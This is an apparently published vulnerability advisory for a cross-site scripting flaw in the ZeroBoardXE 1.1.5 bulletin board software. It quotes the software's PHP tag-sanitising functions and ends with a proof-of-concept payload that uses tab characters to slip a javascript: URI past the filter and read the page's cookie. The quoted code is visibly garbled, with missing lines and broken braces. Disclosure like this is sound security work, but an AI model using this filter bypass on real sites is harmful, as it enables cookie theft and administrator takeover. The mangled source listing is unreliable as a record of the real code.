ZeroBoardXE 1.1.5 (09.01.22) XSS Vulnerability
==============================================


/*************************

ZeroBoardXE (VERSION 1.1.5 (09.01.22))is most famous and widely used bulletin board system of Korea.
It is freely available for all platforms that supports PHP and MySQL.
I find a XSS vulnerability. 
By using this vulnerability, Malicious person can occupy administrator permission,
It means attacker can control board system fully 
Here is the details:

**************************/
TEST ON VERSION ZeroBoardXE 1.1.5 (09.01.22)
Download : http://www.zeroboard.com
/***************************
[0x01] XSS vulnerability

/config/func.inc.php

    function removeHackTag($content) {




        return $content;
    }

    function removeJSEvent($matches) {
        $attrs = $matches[2];

        }

            &#039; _on$2=&#039;,
            $attrs
        );


        return &#039;<&#039;.$matches[1].$attrs.&#039;>&#039;;
    }

    function removeSrcHack($matches) {
        $tag = strtolower(trim($matches[1]));

        $buff = str_replace(array(&#039;&&#039;,&#039;&&#039;),array(&#039;&&#039;,&#039;&&#039;),$buff);

        $oXmlParser = new XmlParser();
        $xml_doc = $oXmlParser->parse($buff);

        $src = $xml_doc->{$tag}->attrs->src;
        $dynsrc = $xml_doc->{$tag}->attrs->dynsrc;
        $lowsrc = $xml_doc->{$tag}->attrs->lowsrc;
        $href = $xml_doc->{$tag}->attrs->href;
        if(_isHackedSrc($src) || _isHackedSrc($dynsrc) || _isHackedSrc($lowsrc) || _isHackedSrc($href) ) return sprintf("<%s>",$tag);

        return $matches[0];
    }

    function _isHackedSrc($src) {
        if(!$src) return false;
        if($src) {
            $url_info = parse_url($src);
            $query = $url_info[&#039;query&#039;];
            $queries = explode(&#039;&&#039;, $query);
            $cnt = count($queries);
            for($i=0;$i<$cnt;$i++) {
                $tmp_str = strtolower(trim($queries[$i]));
                $pos = strpos($tmp_str,&#039;=&#039;);
                if($pos === false) continue;
                $key = strtolower(trim(substr($tmp_str, 0, $pos)));
                $val = strtolower(trim(substr($tmp_str,$pos+1)));
            }
        }
        return false;
    }

//Developer try to detect XSS hardly,
//But That`s not enough..
//The real-hacker can bypass it.
//I`m just used 09 trick.
//That`s all 
*************************/

poc:
<img lowsrc="j	a	v	a	s	c	ri	pt:alert((eval((&#039;D&#039;+&#039;o&#039;+&#039;C&#039;+&#039;u&#039;+&#039;M&#039;+&#039;e&#039;+&#039;N&#039;+&#039;t&#039;+&#039;.&#039;+&#039;C&#039;+&#039;o&#039;+&#039;O&#039;+&#039;k&#039;+&#039;I&#039;+&#039;e&#039;).toLowerCase())));">




